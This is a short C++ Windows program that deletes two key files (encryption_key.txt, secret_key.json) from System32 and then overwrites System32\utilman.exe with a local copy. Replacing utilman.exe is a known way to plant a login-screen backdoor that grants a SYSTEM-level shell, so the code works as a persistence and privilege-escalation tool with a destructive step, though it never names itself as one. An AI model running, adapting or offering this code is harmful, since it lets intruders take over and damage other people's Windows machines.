#include <iostream>
#include <Windows.h>
#include <stdlib.h>

void handleError(DWORD errorCode) {
    switch (errorCode) {
    case ERROR_ACCESS_DENIED:
        std::cerr << "Error: Access denied. You don't have the required permission." << std::endl;
        break;
    case ERROR_FILE_NOT_FOUND:
        std::cerr << "Error: File not found." << std::endl;
        break;
    default:
        std::cerr << "Error: Failed with error code " << errorCode << std::endl;
        break;
    }
}

int main() {
    const std::string utilmanPath = "utilman.exe";
    const std::string systemRoot = "SystemRoot";
    char* systemRootPath = nullptr;
    size_t requiredSize;

    // Get the required size for the buffer
    errno_t err = _dupenv_s(&systemRootPath, &requiredSize, systemRoot.c_str());

    if (err == 0 && systemRootPath != nullptr) {
        const std::string destinationPath = std::string(systemRootPath) + "\\System32\\utilman.exe";

        // Delete existing files before copying utilman.exe
        if (!DeleteFile((std::string(systemRootPath) + "\\System32\\encryption_key.txt").c_str())) {
            handleError(GetLastError());
        }

        if (!DeleteFile((std::string(systemRootPath) + "\\System32\\secret_key.json").c_str())) {
            handleError(GetLastError());
        }

        // Copy utilman.exe to System32 folder
        if (CopyFileA(utilmanPath.c_str(), destinationPath.c_str(), FALSE)) {
            std::cout << "utilman.exe copied successfully to System32 folder." << std::endl;
        }
        else {
            handleError(GetLastError());
            free(systemRootPath);
            system("pause");
            return 1;
        }

        // Free the allocated buffer
        free(systemRootPath);
    }
    else {
        std::cerr << "Error getting SystemRoot path: " << err << std::endl;
        system("pause");
        return 1;
    }
    system("pause");
    return 0;
}
